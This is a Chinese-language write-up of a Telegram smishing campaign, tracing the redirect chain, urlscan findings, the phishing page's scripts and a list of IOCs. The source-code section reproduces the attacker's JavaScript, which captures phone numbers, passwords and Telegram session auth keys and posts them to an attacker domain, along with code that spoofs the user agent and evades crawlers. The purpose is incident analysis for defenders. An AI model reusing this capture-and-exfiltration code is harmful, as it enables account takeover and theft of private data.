# Telegram 钓鱼事件分析：鱼叉式攻击链路解析

本文章阅读时间为10~15分钟

本文基于一次真实的 Telegram 钓鱼案例，从事件背景、短信与页面异常现象入手，逐步深入到技术分析环节，最终构建较为完整的攻击链与风险评估报告。作为一名从事道德黑客与网络侦查工作的安全人员，本文力求以专业视角剖析此类鱼叉式钓鱼攻击，为同仁提供参考与防范建议。

---

## 一、事件背景与概述

### 1. 引言
Telegram 凭借其高隐私性和加密通信功能，受到全球用户的广泛欢迎。然而，伴随着用户数的激增，针对 Telegram 的社工攻击、钓鱼手段也日益翻新。本文记录了本人在 2025 年 3 月 27 日遭遇的一起钓鱼事件，并基于实际抓包、平台在线分析等工具，对攻击链进行初步梳理与风险评估。

### 2. 事件经过
- **注册过程**：  
  - **2025/03/27 15:52**：本人使用自持的香港手机卡注册 Telegram X，顺利接收到验证码短信，并完成注册。  
  ![](https://github.com/b2git/my_article/blob/master/screenshot/%E6%AD%A3%E5%B8%B8%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9F%AD%E4%BF%A1.png?raw=true)
  - **2025/03/27 16:45**：随后收到一条短信，内容宣称“您的 Telegram 账号存在严重违规行为”，要求在 12 小时内访问 `t.ly/TNb1-tg` 进行验证，否则账号将被收回。
  ![](https://github.com/b2git/my_article/blob/master/screenshot/%E6%81%B6%E6%84%8F.png?raw=true)

- **初步观察**：  
  - 打开短信中的链接后，页面界面与 Telegram 官方风格不符
  - 短信文案充满威胁性，并利用了短信欺骗（SMS Spoofing）技术伪造官方信源发送短信，利用“官方警告”制造恐慌。  
  - 作为道德黑客，本人深谙钓鱼社工技术，并凭借对 Telegram 产品及 UI 的熟悉，迅速判断该页面为鱼叉式钓鱼攻击页面，意在窃取用户敏感信息。

### 3. 可疑短信与页面特征
- **短信特征**：  
  - 紧急通知与账号“违规”警告，措辞恐吓，意图促使用户在短时间内点击链接。  
  - 发送的短链接 `t.ly/TNb1-tg` 明显不属于 Telegram 官方域名，存在隐匿真实跳转目标的风险。

- **页面异常**：  
  - 页面 UI 设计粗糙，与 Telegram 官方一致性不足。  
  - 存在疑似诱导用户输入手机验证码及其他敏感信息的表单。
  ![](https://github.com/b2git/my_article/blob/master/screenshot/%E5%89%8D%E7%AB%AF%E9%A1%B5%E9%9D%A2%E6%88%AA%E5%9B%BE.png?raw=true)

### 4. 阅读提示
接下来的部分中，我将从以下几个方面进行深入的技术分析：  
- 网络抓包与流量监控  
- 前端分析在线平台报告解析  
- 页面源码与行为分析  
- 后端服务器与域名调查  
- 完整的风险评估与攻击链构建  

---

## 二、技术细节与深入分析

### 1.网络抓包结果详细分析

根据抓包数据（tgh5.txt），我们可以提取出以下关键信息与结论：

1. **短链接重定向与域名混淆**  
   - **短链接伪装**：请求 `https://t.ly/TNb1-tg` 返回 HTTP/2 302 重定向，将用户引导至 `http://collegctor.org`。  
   - **目的**：利用短链接隐藏真实目的地，并通过重定向链条让用户难以判断最终访问的页面是否为官方页面。
2. **伪造的钓鱼页面特征**  
   - **钓鱼页面内容**：访问 `https://collegctor.org/` 返回的 HTML 包含大量伪造的 Telegram Web 元素，试图模仿官方界面。  
   - **JS 脚本干预**：页面内嵌的 JavaScript 代码主动修改浏览器行为（如检测设备类型并尝试跳转到 `https://tg.tgackiouc.com/`），进一步混淆用户判断。
4. **混合调用与API接口仿真**  
   - **API 请求异常**：钓鱼页面发起了对多个域名的 API 调用，如 `venus.web.telegram.org/apiw1` 和 WebSocket 请求至 `kws2.web.telegram.org/apiws`。  
   - **返回状态异常**：部分接口返回 404 或升级为 WebSocket 协议，说明这些调用并非真正来自 Telegram 官方，而是伪造页面为了模拟 Telegram 正常业务逻辑而发起的混淆请求。
5. **辅助请求与数据采集**  
   - **后台记录**：对 `https://test.wufulinm-tg.top/index/index/access` 的请求返回 200 OK，暗示该页面可能在后台收集用户访问数据，进一步支持钓鱼活动的全链路监控。

![Brup抓包](https://raw.githubusercontent.com/b2git/my_article/refs/heads/master/screenshot/burp%E6%8A%93%E5%8C%85%E6%88%AA%E5%9B%BE.png)

---

### 2.urlscan.io 分析结果解读

1. **基本信息与恶意判定**  
   - **恶意标识**：  
     - urlscan.io 给出“Potentially Malicious”的判定，且 Google Safe Browsing 已将其标记为恶意。  
   - **域名信息**：  
     - 域名 `collegctor.org` 创建于 2025 年 3 月 24 日，注册机构为 Gname.com Pte. Ltd.。  
     - 域名年龄极短，这通常是钓鱼网站常见的特征。
   
2. **服务器与网络流量**  
   - **主 IP 信息**：  
     - 主要 IP 为 101.33.76.53，位于韩国首尔，归属 TENCENT-NET-AP-CN（腾讯大厦）。  
     - 此外还涉及 IP 150.109.84.82，同样隶属于腾讯的网络资源。  
   - **HTTP 事务数量**：  
     - 执行了 259 个 HTTP 事务，涉及 3 个 IP、2 个域名和 2 个子域名

3. **TLS 证书与加密传输**  
   - **证书详情**：  
     - TLS 证书由 R10 于 2025 年 3 月 24 日签发，有效期为 3 个月。  
   - **安全性分析**：  
     - 虽然采用 HTTPS 加密，但短期证书和近期签发时间常见于临时搭建的钓鱼网站，目的在于迅速建立信任感并诱导用户提交敏感信息。

4. **技术栈与页面呈现**  
   - **页面外观**：  
     - 页面的标题为 “Telegram Web”，明显试图模仿 Telegram 官方页面，误导用户。  
   - **检测到的技术**：  
     - 使用了 jQuery 等常见的 JavaScript 库，这表明攻击者利用成熟的前端框架快速搭建仿冒页面。

---

### 3. 源代码与页面行为分析

本节基于攻击者伪造的前端文件（包含 `collegctor.org前端html`、`index-ee5db018.js`、`login.js`、以及 `red.js`）进行深入解析，重点关注其如何通过页面重定向、修改浏览器行为以及捕获用户敏感信息来实施钓鱼攻击。

---

#### 3.1 `collegctor.org`前端html 分析

- **浏览器与设备检测**  
  
  ~~~js
  if (!browser.versions.mobile) {
      location.href = 'https://tg.tgackiouc.com/';
  }
  ~~~
  - 当检测到用户使用的不是移动端浏览器时，会将访问者重定向至另一个域名。这种策略可能用来降低安全研究人员利用桌面环境进行分析的风险。
  
- **伪造的 User-Agent**  
  ~~~js
  var customUserAgent = 'Telegram安全檢測中心';
  Object.defineProperty(navigator, 'userAgent', {
      value: customUserAgent,
      writable: false
  });
  ~~~
  - 攻击者通过覆盖 `navigator.userAgent`，将访问者的浏览器标识伪装成特定的字符串，从而误导用户及部分自动化工具，达到伪装成官方渠道的效果。

- **后端数据收集**  
  ~~~js
  function access(){
      var httpRequest = new XMLHttpRequest();
      httpRequest.open('GET', 'https://test.wufulinm-tg.top/index/index/access', true);
      httpRequest.send();
  }
  
  access();
  ~~~
  - 页面加载后自动调用 `access()`，向指定服务器发送请求，可能用于记录访问信息、统计用户数据，或与后续恶意操作关联。

---

#### 3.2 `index-ee5db018.js` 分析

- **核心功能混淆与逻辑修改**  
  - 文件体积较大，包含大量与 Telegram Web 类似的逻辑，但经过混淆处理。  
  - 代码中混入了对浏览器、操作系统的检测逻辑，对不同设备进行适配或重定向处理，有助于攻击者规避安全检测并针对特定用户群体实施钓鱼攻击。

- **数据存储与通信逻辑**  
  - 脚本中存在大量对 Local Storage 以及 IndexedDB 的操作，与 Telegram 正常逻辑相似，但细节可能被篡改，以便窃取或拦截用户的敏感数据。

---

#### 3.3 `login.js` 分析

- **实时监控用户输入**  
  ~~~js
  $(".input-field-phone .input-field-input").on("input", function() {
      var phone = $(".input-field-phone .input-field-input").text();
      console.log(phone);
      localStorage.setItem('Phone', phone);
  });
  
  $('input[name="notsearch_password"]').on("input", function(e) {
      console.log(this.value);
      localStorage.setItem('password', this.value);
  });
  ~~~
  - 通过监听手机号和密码输入框的输入事件，实时捕获并存储用户输入数据到 `localStorage`。

- **检测登录状态并上传数据**  
  ~~~js
  function login_status(){
      var status = setInterval(function() {
          userid_data = JSON.parse(localStorage.getItem('user_auth'));
          if (userid_data['id'] != null && userid_data['id'] != '') {
              console.log("登录成功");
              // 组装各种敏感数据
              var userid = userid_data['id'];
              var logintime = Math.floor(new Date().getTime() / 1000);
              var dc = localStorage.getItem('dc');
              var Phone = localStorage.getItem('Phone');
              var password = localStorage.getItem('password');
              var stateId = localStorage.getItem('state_id');
              var dcServerSalt = localStorage.getItem(`dc${dc}_server_salt`);
              var dcAuthKey = localStorage.getItem(`dc${dc}_auth_key`);
  
              $.post("https://aladj.wufulinm-tg.top/api/index/save", {
                  userAuthId: Number(userid),
                  userAuthDate: Number(logintime),
                  phone: Phone,
                  pwd: password,
                  userAuthDcId: Number(dc),
                  dcServerSalt: dcServerSalt.substring(1, dcServerSalt.length - 1),
                  dcAuthKey: dcAuthKey.substring(1, dcAuthKey.length - 1),
                  stateId: Number(stateId),
                  url: "web"
              }, function(data, status){
                  console.log("数据上传完毕");
                  localStorage.clear();
                  $(window).attr('location','/telegram/index.html'); // 跳转到空白页
              });
  
              clearInterval(status);
          }
      }, 100);
  }
  ~~~
  - 一旦检测到用户登录成功（即 `user_auth` 数据存在），脚本会将捕获的手机号、密码以及 Telegram 认证数据（如 DC 服务器盐和认证密钥）上传到攻击者控制的服务器，然后清空本地存储并重定向页面，防止用户察觉异常。

---

#### 3.4 `red.js` 分析

- **环境与爬虫检测**  
  ~~~js
  if (/Googlebot\/|Googlebot-Mobile|...|SkypeUriPreview|Veoozbot|Slackbot|redditbot|.../.test(navigator.userAgent)) {
      // 针对爬虫和安全扫描工具采取不同处理策略
  }
  ~~~
  - 通过长串正则表达式检测 User-Agent 中是否包含常见爬虫或安全工具的标识，若检测到则可能采取不同策略或阻止进一步显示钓鱼页面，以避免被自动化工具检测到。

- **PC 端跳转逻辑**  
  ~~~js
  if (!browser.versions.mobile) {
      console.log('PC');
      location.href = 'https://web.telegram.org/a/';
  }
  ~~~
  - 对于非移动设备，脚本会直接跳转至一个看似正常的 Telegram Web 地址，从而减少桌面用户或安全研究人员的进一步分析风险。

---

#### 3.5 综合评估

- **多域名联动与重定向**  
  - 通过 `collegctor.org`、`tg.tgackiouc.com`、`test.wufulinm-tg.top`、`aladj.wufulinm-tg.top` 等多个域名协同工作，攻击者构建了一条完整的重定向与数据收集链条。

- **敏感信息窃取**  
  - 主要利用 `login.js` 实时捕获用户输入的手机号和密码，并在检测到用户登录成功后，将包括 Telegram 会话相关的认证数据一起上传到远程服务器。

- **反爬虫与隐蔽措施**  
  - 通过对 User-Agent 的伪造、环境检测以及针对爬虫的正则过滤，攻击者极大地提高了钓鱼页面的隐蔽性和存活时间，降低了被检测的风险。

- **伪装度较高**  
  - 前端页面在视觉和逻辑上高度模仿 Telegram 官方界面，使普通用户难以分辨真伪，而核心恶意代码则在后台悄然运行，实现信息窃取。

---

##### 小结

从以上源代码与页面行为分析来看，攻击者精心构造了一个伪装成 Telegram Web 的钓鱼页面，通过多域名重定向、浏览器环境检测、用户信息实时捕获以及敏感数据上传，成功构建了一个完整的攻击链。用户在不知情的情况下，可能会将手机号、密码及其他认证数据提交给攻击者，导致账号被盗用和隐私泄露。对安全从业者而言，这一案例展示了复杂的前端伪装技术及其对反爬虫和防检测措施的应对策略，应高度重视并及时通报相关部门.

## 三、总结与附录

### 总结
通过本次全面分析，确认攻击者利用鱼叉式钓鱼手段构造了一个伪装成 Telegram 的钓鱼页面。整个攻击链条包括以下关键环节：

- **短信诱骗与短链接重定向**  
  攻击者利用伪造短信（通过SMS欺骗技术）发送短链接 `t.ly/TNb1-tg`，诱导用户点击后经过302重定向进入钓鱼页面。

- **前端页面伪装与环境检测**  
  钓鱼页面通过精心模仿 Telegram Web 的视觉和交互界面，并使用设备检测（如判断是否为移动端）和伪造 User-Agent 来迷惑用户。对PC用户则采取重定向至其它地址以降低被安全研究人员发现的风险。

- **敏感信息实时窃取**  
  通过 `login.js` 脚本，攻击者监听用户在页面上输入的手机号和密码，并在检测到用户登录成功后，将包括 Telegram 认证数据（如 DC 服务器盐和认证密钥）在内的敏感信息上传到攻击者控制的服务器。

- **反爬虫与隐蔽措施**  
  通过复杂的爬虫检测正则表达式和伪造请求头信息，攻击者有效规避了自动化安全扫描工具，延长了钓鱼页面的在线时长。

这些环节构成了一个完整的攻击链，显示出攻击者在信息窃取、伪装以及反检测方面的周密布局。对普通用户而言，这种攻击可能导致账号被盗、隐私泄露以及进一步的二次攻击；而对安全研究者和防御团队来说，该案例提供了识别类似攻击的重要IOC（包括恶意域名、IP地址、短链接和伪造代码逻辑）的依据。

### 附录
- **IOC指标总结**：  
  - 恶意域名：`collegctor.org`（主IP：101.33.76.53，所属腾讯网络）
  - 关联域名：`tg.tgackiouc.com`、`test.wufulinm-tg.top`、`aladj.wufulinm-tg.top`
  - 重定向短链接：`t.ly/TNb1-tg`
  - 域名注册信息：2025年3月24日注册，注册机构为 Gname.com Pte. Ltd.
  - TLS证书：由 R10 签发，有效期3个月
  - 前端恶意代码特征：伪造 User-Agent、环境检测、用户输入窃取、反爬虫逻辑

- **相关截图与工具**：  
  包括短信截图、钓鱼页面截图、抓包数据、urlscan报告以及各文件（HTML、JS）的源代码分析，均为进一步调查提供参考。

- **参考工具与方法**：  
  使用 urlscan.io、Burp Suite、jQuery 监听、Local Storage 调试等技术手段进行数据捕获与行为分析。

这一案例展示了钓鱼攻击的全链条作战模式，提醒用户务必提高安全意识，确保对任何不明来源的短信与链接保持高度警惕，及时采用多因素认证等防护措施，降低被钓鱼的风险。


PS：该文由Chatgpt辅助编写，详情请看链接
